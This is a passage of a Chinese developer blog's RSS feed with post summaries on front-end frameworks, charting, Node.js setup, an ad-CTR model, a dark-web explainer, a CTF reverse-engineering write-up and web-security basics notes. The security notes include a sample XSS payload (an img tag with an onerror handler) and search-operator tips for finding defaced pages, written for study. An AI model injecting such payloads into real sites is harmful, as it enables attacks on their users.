      <description>我知道你在找它，如果没有你打我&#xA;1.取消Cesium版权信息 $(&#34;.cesium-widget-credits&#34;).remove(); 或&#xA;const credits = document.getElementsByClassName(&#34;cesium-widget-credits&#34;); credits[0].parentElement.removeChild(credits[0]); 2.禁止双击zoom到Entity viewer.cesiumWidget.screenSpaceEventHandler.removeInputAction(Cesium.ScreenSpaceEventType.LEFT_DOUBLE_CLICK); 效果：禁止双击放大地图&#xA;3.标记去掉地形遮挡 entity.billboard.disableDepthTestDistance = Number.POSITIVE_INFINITY 4.禁用默认相机控制事件 scene.screenSpaceCameraController.enableRotate = false; scene.screenSpaceCameraController.enableTranslate = false; scene.screenSpaceCameraController.enableZoom = false; scene.screenSpaceCameraController.enableTilt = false; scene.screenSpaceCameraController.enableLook = false; 5.地球移动事件 camera.moveStart.addEventListener(function() { }); camera.moveEnd.addEventListener(function() { }); 6.球缩放事件 viewer.camera.changed.addEventListener(function(percentage) { }); 7.修改鼠标操作习惯&#xA;利用Cesium.ScreenSpaceCameraController(scene)实现&#xA;例如：&#xA;//设置操作习惯,更换中键和右键 viewer.scene.screenSpaceCameraController.tiltEventTypes = [ Cesium.CameraEventType.RIGHT_DRAG, Cesium.CameraEventType.PINCH, { eventType: Cesium.CameraEventType.LEFT_DRAG, modifier: Cesium.KeyboardEventModifier.CTRL }, { eventType: Cesium.CameraEventType.RIGHT_DRAG, modifier: Cesium.KeyboardEventModifier.CTRL } ]; viewer.scene.screenSpaceCameraController.zoomEventTypes = [Cesium.CameraEventType.MIDDLE_DRAG, Cesium.CameraEventType.WHEEL, Cesium.</description>
    </item>
    <item>
      <title>ionic4自定义组件报错’ion-‘ is not a known element:</title>
      <link>https://anwangtanmi.github.io/posts/3c8c48b74c88534139b5fe8cbbf81248/</link>
      <pubDate>Fri, 12 Apr 2019 21:49:18 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3c8c48b74c88534139b5fe8cbbf81248/</guid>
      <description>项目要把顶部返回按钮抽成单个组件，于是使用ionic g component xx/xx/back 生成了组件文件&#xA;back.component.html中使用了ion-buttons&#xA;然后在公共的sharedModule里引入了这个组件：&#xA;@NgModule({ declarations: [BackComponent], imports: [CommonModule], exports: [BackComponent], }) export class SharedModule {} 结果一直报错：&#xA;Uncaught Error: Template parse errors: &#39;ion-back-button&#39; is not a known element: 1. If &#39;ion-back-button&#39; is an Angular component, then verify that it is part of this module. 2. If &#39;ion-back-button&#39; is a Web Component then add &#39;CUSTOM_ELEMENTS_SCHEMA&#39; to the &#39;@NgModule.schemas&#39; of this component to suppress this message. (&#34; [ERROR -&amp;gt;] .</description>
    </item>
    <item>
      <title>Highcharts的一些操作</title>
      <link>https://anwangtanmi.github.io/posts/4d3f4cb4113a666362683b45638ac4c5/</link>
      <pubDate>Wed, 27 Mar 2019 17:16:35 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/4d3f4cb4113a666362683b45638ac4c5/</guid>
      <description>Highcharts的一些操作 去掉打印按钮 去掉右下角的网址信息 隐藏图例 导出数据设置 柱状图默认显示数字 3D饼图，显示对应的值和百分比 去掉打印按钮 Highcharts官网实例eg:https://jshare.com.cn/demos/NPVyQW&#xA;exporting:{ enabled:true //用来设置是否显示‘打印’,&#39;导出&#39;等功能按钮，不设置时默认为显示 }, 去掉右下角的网址信息 Highcharts官网实例eg:https://jshare.com.cn/demos/NPVyQW&#xA;credits: { enabled:false //去掉网址信息 }, 隐藏图例 Highcharts官网实例eg:https://jshare.com.cn/demos/NPVyQW&#xA;即:点击柱状图下边的 蓝色小圆和文字 会将数据隐藏&#xA;隐藏代码：&#xA;legend: { //隐藏图例 enabled: false }, 导出数据设置 设置一个js即可&#xA;&#34;http://cdn.hcharts.cn/libs/highcharts-export-csv/export-csv.js&#34; //2018年版本成功 或者 http://cdn.hcharts.cn/highcharts/modules/export-data.js -- 这个在官网可以成功(2019年版本) 柱状图默认显示数字 plotOptions: { column:{ dataLabels:{ enabled:true, // dataLabels设为true style:{ color:&#39;#000&#39; } } } }, 3D饼图，显示对应的值和百分比 效果图：&#xA;plotOptions: { pie: { allowPointSelect: true, cursor: &#39;pointer&#39;, depth: 35, dataLabels: { enabled: true, //format: &#39;{point.</description>
    </item>
    <item>
      <title>H5页面在iOS网页数字颜色自动被改变成蓝色</title>
      <link>https://anwangtanmi.github.io/posts/311169bb14d160b78f7b4a71008d8007/</link>
      <pubDate>Mon, 25 Mar 2019 19:14:32 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/311169bb14d160b78f7b4a71008d8007/</guid>
      <description> 造成该问题的原因在于Safari浏览器的问题：&#xA;解决该问题只需在head标签中添加如下代码即可解决&#xA;&amp;lt;meta name = &#34;format-detection&#34; content = &#34;telephone=no&#34;&amp;gt; </description>
    </item>
    <item>
      <title>同一表格根据不同排序条件查询</title>
      <link>https://anwangtanmi.github.io/posts/0ae6f10c5d731452e05a2c2079d05ba1/</link>
      <pubDate>Sat, 16 Mar 2019 21:13:14 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/0ae6f10c5d731452e05a2c2079d05ba1/</guid>
      <description>1.template&#xA;{{ scope.row.PRICE}} {{ scope.row.WEIGHT}} 2.method&#xA;handleSortChange(val){ console.log(val) if(val.column==null){ this.Sort(&#39;&#39;,&#39;&#39;,this.pageNo) return } if(val.column.label==&#39;产品价格(元/g)&#39;&amp;amp;&amp;amp;val.order==&#39;descending&#39;){ this.Sort(&#39;PRICE&#39;,&#34;desc&#34;,this.pageNo) this.productType=&#39;PRICE&#39;; this.sortOrder=&#34;desc&#34;; } if(val.column.label==&#39;产品价格(元/g)&#39;&amp;amp;&amp;amp;val.order==&#39;ascending&#39;){ this.Sort(&#39;PRICE&#39;,&#34;asc&#34;,this.pageNo) this.productType=&#39;PRICE&#39;; this.sortOrder=&#34;asc&#34;; } if(val.column.label==&#39;产品规格(g)&#39;&amp;amp;&amp;amp;val.order==&#39;descending&#39;){ this.Sort(&#39;WEIGHT&#39;,&#34;desc&#34;,this.pageNo) this.productType=&#39;WEIGHT&#39;; this.sortOrder=&#34;desc&#34;; } if(val.column.label==&#39;产品规格(g)&#39;&amp;amp;&amp;amp;val.order==&#34;ascending&#34;){ this.Sort(&#39;WEIGHT&#39;,&#34;asc&#34;,this.pageNo) this.productType=&#39;WEIGHT&#39;; this.sortOrder=&#34;asc&#34;; } console.log(val,&#39;val&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&#39;) }, Sort(x,y,pageNO,pageSize){ console.log(x,y,pageNO,pageSize) this.keepX=x this.keepY=y console.log(this.material) let parames = { &#34;functionName&#34;: &#34;preciousmetalbiz.service.PrdMetalService&#34;, &#34;methodName&#34;: &#34;selectPmList&#34;, &#34;pageNo&#34;:pageNO, &#34;pageSize&#34;:10, &#34;data&#34;: { // 查询条件 prdCode: this.prdCode,&#x9;// 产品代码 prdName: this.prdName,&#x9;// 产品名称 weightStart: this.weightStart,&#x9;// 规格（开始） weightEnd: this.weightEnd,&#x9;// 规格（结束） priceStart: this.</description>
    </item>
    <item>
      <title>H5&#43; Hbuilder 状态栏设置颜色</title>
      <link>https://anwangtanmi.github.io/posts/ae16985e77b6bb41cb12d868c9514a31/</link>
      <pubDate>Fri, 15 Mar 2019 23:52:55 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/ae16985e77b6bb41cb12d868c9514a31/</guid>
      <description>if (this.isJudge) {//如果是H5+ if (this.currentItem == 11) { //朋友 plus.navigator.setStatusBarStyle(&#39;dark&#39;); } else { plus.navigator.setStatusBarStyle(&#39;light&#39;); } } 设置了很长时间没效果&#xA;后来才知道 只支持两种颜色</description>
    </item>
    <item>
      <title>浅析deep深度选择器</title>
      <link>https://anwangtanmi.github.io/posts/e2c0bcd1f07e7e6f8bac25fd70c9f022/</link>
      <pubDate>Thu, 14 Mar 2019 09:44:53 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/e2c0bcd1f07e7e6f8bac25fd70c9f022/</guid>
      <description>之前在开发中遇到一个问题，vue项目结合element ui使用。&#xA;但是element ui的样式不一定符合我们的需求，这时我们就需要改变它的样式。&#xA;比如博主使用到了element ui的表格，但是表格有默认的背景色，鼠标滑过还有默认的高亮颜色。&#xA;我想要改变这个鼠标滑过的样式，所以我需要在页面中审查元素找到对应的标签。&#xA;但是当我找到并且复制，然后试图去改变它的样式时，怎么都没办法改变。&#xA;我以为是权重的问题，所以我加 ! important，但是也毫无作用。&#xA;当我审查元素发现此样式就没有作用到，就相当于它没有找到这个元素，所以也就不存在改不改变样式的问题了。&#xA;这时我们就需要一个选择器能深度的帮助我们找到这个元素，比如 deep（划重点）&#xA;1、这是我起初试图改变的方法（亲测无效）：&#xA;.el-table--enable-row-hover .el-table__body tr:hover&amp;gt;td { background: lightblue !important; color: #000; } 2、这是使用deep后的方法（亲测有效）：&#xA;.el-table--enable-row-hover /deep/ .el-table__body tr:hover&amp;gt;td { background: lightblue ; color: #000; } 原理就是通过找到父元素深度的找到我们需要改变的子元素，然后改变它的样式即可。&#xA;感觉发现了什么不得了的东西。&#xA;是不是意味着我使用第三方ui 库，就可以随意改变它的样式了。&#xA;好了，以上就是deep的一些基本用法，如需深入了解，请参考官方介绍。&#xA;博主后期也会了解更新，尽情期待。&#xA;如有问题，请指出，接受批评。</description>
    </item>
    <item>
      <title>【译】媒体查询特性 – 适应用户偏好 | perfers-reduced-motion | prefers-color-scheme | Save data</title>
      <link>https://anwangtanmi.github.io/posts/6957ecca3b79a34d453a9be3d82a0f11/</link>
      <pubDate>Sun, 10 Mar 2019 17:02:46 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/6957ecca3b79a34d453a9be3d82a0f11/</guid>
      <description>为了践行新的一年能翻译12+的国外技术博客文章的目标，今天就让我们开始第一篇。&#xA;本篇文章翻译自一位专注于H5、CSS、web性能的自由开发者： Michael Scharnagl。&#xA;译者引言：&#xA;当我们在使用APP时，我们在 设置中常会发现这么一项操作：如无图模式、夜间模式等等，这些设置项来自对用户偏好的考量。为了打造轻应用的进展中，在web中也将逐步实现这样的特性。今天，我们就来了解一下关于在web中打造用户偏好的特性。&#xA;适应用户偏好 在过去的几年里，浏览器实现了各种功能，可以使用CSS、JavaScript或检查服务器端的首选项来响应web上的用户偏好。在本文中，将展示浏览器当前公开的用户偏好、处理它们的最佳方式，以及对未来的展望，以了解可能很快就会出现什么。&#xA;perfers-reduced-motion 让我们从减少运动媒体查询（perfers-reduced-motion）开始。这项特性是在Safari10.1中引入的，目前在Safari、IOS Safari、Firefox和Chrome的最新版本中得到支持。&#xA;perfers-reduced-motion这项特性被用于检测用户是否需要系统将其使用的动画或运动最小化。你可以用下面的方式检测：&#xA;@media (perfers-reduced-motion: reduce) { /* disable animations/transitions 禁用动画或过渡*/ } 或者使用另一种方式：&#xA;var motionQuery = matchMedia(&#39;(perfers-reduced-motion)&#39;); function handleReduceMotionChanged() { if (motionQuery.matches) { /*disabled animations/transitions 禁用动画或过渡*/ }else { /*enable animations/transitions 开启动画或过渡*/ } } motionQuery.addListenet(handleReduceMotionChanged); handleReduceMotionChanged(); 但是，对所有CSS 动画(animation)和过渡(transition)禁用perfers-reduced-motion:reduce的方式是：&#xA;@media (perfers-reduced-motion: reduce) { * { transition: none !important; animation: none !important; } } 但是，这样做并不会触发动画开始/结束事件或关键帧(animation start/end events or keyframe states)状态。所以，如果你的代码依赖于这些事件，你还需要这么做：&#xA;@media (perfers-reduced-motion: reduce) { * { transition-duration: 0.</description>
    </item>
    <item>
      <title>网易WEB白帽子-WEB安全基础</title>
      <link>https://anwangtanmi.github.io/posts/1b3a3adbc861f96ae86e41e4dedee7ec/</link>
      <pubDate>Sun, 03 Mar 2019 21:19:26 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/1b3a3adbc861f96ae86e41e4dedee7ec/</guid>
      <description>网易WEB白帽子 02..WEB安全基础 1.钓鱼&#xA;诱惑性的标题，仿冒真实网址，骗取用户账户，骗取用户资料&#xA;2.网页‘篡改’&#xA;hacked by&#xA;Intitle : keyword 标题中还有关键字的网页&#xA;Intext : keyword 正文中还有关键字的网页&#xA;Site : domain 在某个域名或者子域名下的网页&#xA;3. 暗链&#xA;隐藏在网站中的链接&#xA;网游/医疗/博彩/色情&#xA;提高网站排名&#xA;4. Webshell(后门)&#xA;web后门获取权限&#xA;XSS 跨站脚本 黑客通过‘HTML’篡改网页，插入恶意脚本，当用户在浏览网页时，实现控制用户浏览器行为的一种攻击方式。&#xA;XSS分类&#xA;存储型 访问网站，触发XSS(Firebug插件) &amp;lt; img src = ‘’#‘’onerror = ‘alert(hello)’&amp;gt; # 不是一个有效的图片，导致加载失败,进而触发事件 反射型 访问携带带有XSS脚本的链接，触发XSS 通过后端WEB应用程序将XSS脚本，将XSS脚本写入响应页面中，在浏览器在响应页面时触发XSS DOM型 访问携带带有XSS脚本的链接，触发XSS（不在URL参数中，在URL的哈希中）哈希的#分隔符 前端用JavaScript将XSS脚本写入DOM中，触发XSS CSRF 跨站请求伪造 利用用户已登录的身份，在用户不知道的情况下，以用户的名义完成非法操作。&#xA;点击挟持 通过覆盖不可见的框架诱导受害者点击而造成的攻击行为。&#xA;iframe&#xA;UI-覆盖&#xA;URL跳转 借助未未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而引导的安全问题。&#xA;Header头跳转&#xA;Javascript跳转&#xA;META标签跳转&#xA;SQL注入 访问修改数据，或者利用潜在的数据库漏洞进行攻击&#xA;命令注入 CURL命令&#xA;D:\test&amp;gt;curl -I &#34;http://www.163.com&#34; HTTP/1.0 302 Moved Temporarily Allow: GET,POST,HEAD MIME-Version: 1.</description>
    </item>
    <item>
      <title>node.js -windows二进制文件安装方式</title>
      <link>https://anwangtanmi.github.io/posts/c9c9c9bd28a948cb44b282e24d39099e/</link>
      <pubDate>Wed, 13 Feb 2019 08:56:35 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/c9c9c9bd28a948cb44b282e24d39099e/</guid>
      <description>文章目录 1. 下载 2. 解压 3. 配置环境变量一 4. 修改npm的默认配置 5. 配置环境变量二 6. 修改镜像源 7. 更新Node版本和npm版本 1. 下载 下载地址：https://nodejs.org/en/download/&#xA;2. 解压 下载的压缩包解压后如下所示：&#xA;新版的Node.js已自带npm，就在下图所示的node_modules包中。&#xA;npm的作用：是对Node.js依赖的包进行管理，类似maven&#xA;3. 配置环境变量一 此时可以在cmd中输入node -v,npm -v 获取到node.js , npm的版本信息&#xA;4. 修改npm的默认配置 因为npm的默认配置会将文件存到c盘，所以修改一下路径。&#xA;在解压之后的文件路径下新建两个文件夹：&#xA;node_cache：npm的缓存路径&#xA;node_global：npm的安装全局模块的路径&#xA;创建好之后，打开cmd执行下边两条命令，修改npm的默认配置：&#xA;npm config set prefix &#34;D:\work\node-v10.15.1-win-x64\node_global&#34; npm config set cache &#34;D:\work\node-v10.15.1-win-x64\node_cache&#34; 5. 配置环境变量二 在系统变量下新建”NODE_PATH”，由于改变了module的默认地址，所以用户变量要跟着改变一下PATH，要不使用module的时候会导致输入命令出现“xxx不是内部或外部命令，也不是可运行的程序或批处理文件”这个错误。&#xA;node.js 的全局依赖模块的路径：&#xA;其路径中的node_modules 不用创建，在下载依赖模块时，会自动创建该文件夹，并将依赖模块存储在其中&#xA;同时还要设置用户变量&#xA;6. 修改镜像源 查看镜像源地址 npm config list # 结果 metrics-registry = &#34;https://registry.npmjs.org/&#34; 将镜像源设为淘宝的 npm set registry https://registry.</description>
    </item>
    <item>
      <title>easyAR中webAR部分使用问题与解决方案汇总</title>
      <link>https://anwangtanmi.github.io/posts/2b869068ea11fc00b552d000d0ab89d0/</link>
      <pubDate>Thu, 17 Jan 2019 22:38:59 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/2b869068ea11fc00b552d000d0ab89d0/</guid>
      <description>easyAR中webAR部分使用问题与解决方案汇总 Web AR使用方面 threejs使用方面 Web AR使用方面 1.开始识别后，程序每隔一段时间向服务器post一次数据请求，导致对识别图库的调用次数过多&#xA;解决方案：设置单次识别过程中post次数上限，达到上限时调用webar.js中stopRecognize()接口&#xA;2.手机运行WebAR程序，浏览器无法打开摄像头&#xA;解决方案：1）需要HTTPS协议支持。&#xA;2）安卓应用微信或者QQ浏览器过于低级，检查并升级浏览器的内核版本。&#xA;3）WebAR主要是基于WebRTC协议，目前市面上并不是所有的浏览器支持此协议。所以WebAR 主要支持Chrome、Safari、firefox浏览器。对于Android平台，支持在微信、QQ、Chrome、火狐浏览器打开使用；对于iOS平台，仅支持Safari浏览器使用（且必须iOS V11.0+）。&#xA;threejs使用方面 1.fbx模型显示不出来&#xA;解决方案：除却编码错误的可能，模型无法显示可能原因有：&#xA;1）路径错误&#xA;2）fbx模型不满足FBXLoader.js中的模型要求（ Loader loads FBX file and generates Group representing FBX scene.Requires FBX file to be &amp;gt;= 7.0 and in ASCII or &amp;gt;= 6400 in Binary format.Versions lower than this may load but will probably have errors）&#xA;3）摄像头安置位置不对，导致看不到模型实体&#xA;4）模型scale为0&#xA;2.threejs 提供了模型不同动画间crossFade方法，可以采用此方法实现不同动画片段间的淡入淡出切换&#xA;3.如遇到更多问题，可访问http://forum.easyar.cn/portal.php?mod=list&amp;amp;catid=3 （easyAR社区），https://answers.easyar.cn/ （easyAR问答中心），https://threejs.org/ （threejs官网）</description>
    </item>
    <item>
      <title>密码朋克的社会实验（一）：开灯看暗网</title>
      <link>https://anwangtanmi.github.io/posts/7223516edc86892024677c72bd0dab15/</link>
      <pubDate>Thu, 20 Dec 2018 14:48:46 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/7223516edc86892024677c72bd0dab15/</guid>
      <description>密码朋克的社会实验（一）：开灯看暗网&#xA;本文作者：karmayu、murphyzhang @云鼎实验室&#xA;……&#xA;2018年3月8日，某视频网站800余万用户数据在暗网销售&#xA;2018年8月1日，某省1000万学籍数据出现在暗网&#xA;2018年8月28日，某酒店集团5亿数据疑似在暗网出售&#xA;……&#xA;本年度最严重的几次数据泄漏，都指向了同一个词——「暗网」。在中文的语境里，这是一个犹如「月黑风高夜」般的词汇，透着诡秘和犯罪的气息。而与「暗网」关系最密切的另一个词，则非「黑客」莫属。「黑」与「暗」的组合，意味着高超的匿名和隐身技巧，令人忍不住想揭开它精巧的面纱。&#xA;暗网是什么&#xA;要解释暗网，先给整个互联网做一个简单的分层定义，如图：&#xA;|图片来源网络&#xA;表网（Surface Web）&#xA;通常认为，普通用户或者搜索引擎能直接访问的内容属于表网。表现形式为网页或者 APP 提供的内容。&#xA;深网（Deep Web）&#xA;指不能被标准搜索引擎检索到的网络数据。通常是存储在各公司或组织的数据库中，需要用专有的接口查询或干脆不对外查询，例如 Google 的后端数据库。深网数据量远大于表层网络，犹如海面和大海的关系。&#xA;暗网（Dark Web）&#xA;需要通过特殊的加密通道访问的网页或数据。暗网通常具有匿名的特性，既保证访问者的匿名，同时也保证服务提供者的匿名。因此，其中充斥着各种犯罪信息和违法交易（枪支、毒品、色情、暴恐、黑客等）。&#xA;暗网有多个不同的实现版本，下文我们说暗网特指「Tor 网络」。&#xA;网络上有些说法说暗网远大于表层网络，其实很不严谨，是把深网和暗网混为一谈了，真实的暗网只有一小部分人使用，远小于大众使用的表层网络。&#xA;谁创造了暗网&#xA;➢ 密码朋克&#xA;故事要从90年代的一个极小众群体说起——「密码朋克」。这是一个由顶尖数学家、密码学家和程序员组成的群体，他们关注「匿名、自由、隐私」，其中许多人抱着自由主义和无政府主义的理念，并在美国掀起了「加密无政府主义运动」，他们以密码学和互联网为武器，与强权展开直接对抗。&#xA;正是这群人，创造了许多加密技术和协议，也奠定了互联网的许多底层技术和通信协议，从加密邮件到 HTTPS，从 RSA 到区块链，等等等等。&#xA;|图片来源网络&#xA;➢ 国外政府部门&#xA;花开两朵，密码朋克们希望保护自己的信息和隐私不被政府获取；而政府同样也有这个需求，甚至更强烈得多，因为他们要保证情报的传输安全，同时要保护情报人员传递信息时无法被网络追踪。因此，1995年，美国海军研究实验室也进行了匿名网络的相关项目研究，这也就是暗网的前身。&#xA;2004年，「Tor 洋葱网络」正式对外发布，意味着普通用户也可以使用匿名网络技术来保证自己的匿名性。也就代表着「暗网」这个概念正式走向公众。为什么叫洋葱网络，因为其中的通信内容被三重加密，像洋葱一样，剥开一层还有一层。&#xA;Tor 网络虽然理论上比较安全，但其中的中转节点是由志愿者部署，如果掌握了其中足够的节点，也是有概率进行完整通信追踪的。而且这毕竟是孵化自美国海军的一个项目，是否有一些精心构造的安全缺陷，难以确认。&#xA;暗网上的数据泄露&#xA;一个能保证访问者和服务提供者都匿名的网络，天生就是法外之地。&#xA;因此，各路违法信息交流充斥暗网，尤其是2011年后，由于比特币技术的兴起，暗网终于从「匿名的信息交流」进化到了「匿名的价值交换」阶段，这个颠覆性变革，随着「Silk Road」的建立（丝绸之路：可以理解为基于比特币的暗网淘宝），掀起了违法交易的高潮。当然，大概同时也掀起了 FBI 相关部门的加班高潮。&#xA;很巧的是，同样是2011年底，国内发生了一轮标志性的大规模的用户数据泄漏事件，之后各种数据泄漏就成为了每年的常态。早期此类数据交易往往是黑客私下交易，而近年来逐渐被搬到暗网进行交易。为此，腾讯安全云鼎实验室对暗网的主要交易平台进行了监测，并抽取了近几个月针对国内用户的数据泄漏的情况进行了统计。&#xA;可以看到，近期泄漏数据，主要以网购/物流/身份证/酒店/社交帐号数据为主。&#xA;暗网上的业务&#xA;暗网最大的几个市场均在近年被 FBI 捣毁，如 Silk Road、AlphaBay，因此，2017年来暗网黑市有所收敛，并不如前几年火爆。我们统计了目前存在的几大市场商品分类，可以看出，毒品/药物类还是占据了超过50%的份额，海外使用违禁药物的情形非常严峻，其次是数字商品类，并充斥着各种色情、黑客、枪支、护照、假钞等违法内容。&#xA;暗网匿名原理&#xA;暗网最重要的作用是保证匿名，其匿名性体现在两个方面：&#xA;访问普通网站时，网站无法得知访问者 IP 地址。 提供暗网服务时，用户无法得知服务器 IP 地址。 两个能力加起来则保障了暗网用户访问暗网网站时，双方都无法得知对方 IP 地址，且中间节点也无法同时得知双方 IP 地址。听起来挺科幻的，毕竟我们平时使用的 VPN 等科学上网技术只使用了一层跳板，而 Tor 技术使用了三层跳板。</description>
    </item>
    <item>
      <title>【实践】广告ctr模型之Deep cross network (dcn)</title>
      <link>https://anwangtanmi.github.io/posts/3a779e343bf2d77be5173a4e2ac6126d/</link>
      <pubDate>Fri, 07 Dec 2018 11:44:28 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3a779e343bf2d77be5173a4e2ac6126d/</guid>
      <description>广告ctr模型可用的深度模型其本质架构都一样（可见https://blog.csdn.net/dengxing1234/article/details/79916532），这也是限制了模型的发展路线。Deep cross network在广告ctr模型也是应用很常见，它聚焦于解决特征工程的问题，对比paper中提到：【DNN可以自动地学习特征地交互作用，然而，它们隐式地的生成所有的特征交互，这对于学习所有类型的交叉特征不一定有效。于是提出了一种能够保持深度神经网络良好收益的深度交叉网络（DCN），除此之外，它还引入了一个新的交叉网络，更有效地学习在一定限度下的特征相互作用，更有甚，DCN在每一层确切地应用交叉特征而不需要人工特征工程，这相比于DNN模型增加地额外地复杂度可以忽略不计】。自己按照paper和高级的tensorflow api，实现l一版dcn，源码文件3个都已共享。希望有问题各位同行人能指出交流。&#xA;原版paper：https://arxiv.org/abs/1708.05123&#xA;my_core.py from tensorflow.python.framework import tensor_shape from tensorflow.python.layers import base from tensorflow.python.ops import init_ops from tensorflow.python.ops import standard_ops from tensorflow.python.framework import ops class CrossLayer(base.Layer): def __init__(self, use_bias=True, kernel_initializer=None, bias_initializer=init_ops.zeros_initializer(), kernel_regularizer=None, bias_regularizer=None, activity_regularizer=None, kernel_constraint=None, bias_constraint=None, trainable=True, name=None, **kwargs): super(CrossLayer, self).__init__(trainable=trainable, name=name, activity_regularizer=activity_regularizer, **kwargs) self.use_bias = use_bias self.kernel_initializer = kernel_initializer self.bias_initializer = bias_initializer self.kernel_regularizer = kernel_regularizer self.bias_regularizer = bias_regularizer self.kernel_constraint = kernel_constraint self.bias_constraint = bias_constraint self.input_spec = base.</description>
    </item>
    <item>
      <title>彻底解决IOS HTML页面上光标跳行、光标不跟随页面问题</title>
      <link>https://anwangtanmi.github.io/posts/84f9f3631f3074065f956a7904e06aad/</link>
      <pubDate>Wed, 05 Dec 2018 11:59:29 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/84f9f3631f3074065f956a7904e06aad/</guid>
      <description>继：修复IOS上滑动HTML界面光标乱跳&#xA;声明：这里只是说明一种处理方法&#xA;继上一篇文章，处理IOS滑动时，光标不跟随页面滚动，处理方法是，监听touchmove事件，获取当focus的元素，使之失去光标；但是这种方法并不能真正的解决问题，比如，你进入页面，并不滑动页面，而是去点击屏幕可见区域最底下的输入框时，问题就出来了，如图：&#xA;这里说一下，网络上大多说是IOS上fixed定位，修改定位为absolute；或者是添加fastclick.js库，加速手机上tap事件的响应；&#xA;问题就出在这里，你确定你的页面是定位的因素？你确定添加了fastclick库就可以了？如果尝试了上面两种方法还不行，你可以接着往下看；&#xA;仔细观察页面，当你点击最后一行输入框时、滑动页面时，或者是弹框；你可以看到页面上的活动元素先聚焦再滚动；也就是说，activate元素的聚焦事件在页面滚动之前或者滚动完成之前就已经完成了，所以这时候页面滚动，而光标又不跟随滚动，就造成了光标跳行、错乱的问题。&#xA;解决方法：&#xA;一、输入框在聚焦的时候，会弹起软键盘；所以，我们监听软键盘弹起事件，在弹起事件后，进行dom重绘，但是这种必须要加延时，代码如下：&#xA;document.body.addEventListener(&#39;focusin&#39;, function () { //软键盘弹起事件 var node = document.activeElement; //当前focus的dom元素 setTimeout(function () { if (node) { if (node.nodeName == &#34;TEXTAREA&#34; || node.nodeName == &#39;INPUT&#39;) { //如果是input或textarea if (node.style.textShadow === &#39;&#39;) { node.style.textShadow = &#39;rgba(0,0,0,0) 0 0 0&#39;; //改变某个不可见样式，触发dom重绘 } else { node.style.textShadow = &#39;&#39;; } } } }, 1000); }); 二、监听屏幕滚动事件；是屏幕滚动，不是手指滑动的事件，因为我这里使用的是sencha Touch移动端框架，所以，可能会不适应，但是道理是一样的；代码如下：&#xA;initialize: function () { var me = this; me.callParent(); me.</description>
    </item>
    <item>
      <title>【未完结】阮一峰webpack-demos 手动翻译(中文版) 及 学习笔记</title>
      <link>https://anwangtanmi.github.io/posts/626911000661bcece01b086382f6a190/</link>
      <pubDate>Mon, 03 Dec 2018 16:56:23 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/626911000661bcece01b086382f6a190/</guid>
      <description>阮一峰老师的webpack-demos原文链接：https://github.com/ruanyf/webpack-demos。&#xA;webpack官方文档：https://www.webpackjs.com/concepts/targets/。&#xA;最近在学习webpack，我师父给我发了一个阮一峰老师的教程链接，原文是英文的。最近还在学习，我把文章翻译成中文的，顺便自己的笔记和中间遇到的问题&amp;amp;解决方法都记录下来，希望能帮助到大家。&#xA;——————————————————–以下是正文——————————————————-&#xA;这个repo是Webpack一些简单演示程序的集合。&#xA;这些演示是有目的地以简单明了的方式编写的。你会发现跟随他们学习强大的工具没有困难。&#xA;如何使用 首先，全局安装 Webpack 和 webpack-dev-server 。&#xA;$ npm i -g webpack webpack-dev-server 然后，将这些 demos 克隆下来。&#xA;$ git clone https://github.com/ruanyf/webpack-demos.git 接着，安装依赖。&#xA;$ cd webpack-demos $ npm install 现在，就可以使用repo的demo**目录下的源文件（注：例如demo01)&#xA;$ cd demo01 $ npm run dev 如果上述命令没有自动打开浏览器，则必须自己访问 http://127.0.0.1:8080。&#xA;// 更详细的webpack安装流程可以参考：webpack安装详解 ；使用流程可以参考：webpack使用详解：浏览器显示Hello World!。&#xA;// 结合使用，效果更佳。&#xA;前言：什么是webpack Webpack是一个用来为浏览器构建JavaScript模块脚本的前端工具。&#xA;它可以像Browserify一样使用，而且做得更多。&#xA;$ browserify main.js &amp;gt; bundle.js # be equivalent to $ webpack main.js bundle.js Webpack需要一个CommonJS模块的配置文件，叫 webpack.config.js。&#xA;// webpack.config.js module.exports = { entry: &#39;.</description>
    </item>
    <item>
      <title>[Re]南邮ctf平台逆向题</title>
      <link>https://anwangtanmi.github.io/posts/960db5b0a7bfcdd1660661f6c90c25ce/</link>
      <pubDate>Mon, 03 Dec 2018 14:23:16 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/960db5b0a7bfcdd1660661f6c90c25ce/</guid>
      <description>继续学习，这次尝试做了一下南邮ctf平台的逆向题来练习&#xA;目录&#xA;第一题 HELLO,RE！&#xA;第二题 ReadAsm2&#xA;第三题 Py交易&#xA;第四题 WxyVM&#xA;第五题 maze&#xA;第六题 WxyVM 2&#xA;第一题 HELLO,RE！ 打开ida，找到main函数按F5，hexray反编译&#xA;就在眼前 flag{Welcome_To_RE_World!}&#xA;第二题 ReadAsm2 来锻炼汇编的阅读能力吧&#xA;main函数定义了一串字符串，应该就是加密的密文&#xA;通过func解密后输出结果，题目提示调用约定为System V AMD64 ABI&#xA;百度调用约定后，分析结果如下&#xA;总的来说，意思就是函数对输入的字符串每一个字符都与其&#xA;所在缓冲区的索引做异或运算，最后输出结果。&#xA;用py来写解密脚本吧&#xA;flag = [0x0,0x67,0x6e,0x62,0x63,0x7e,0x74,0x62,0x69,0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66,0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c] flagstr = [] index = 0 for ech in flag: flag[index] = ech^index flagstr.append(chr(flag[index])) index = index+1 print 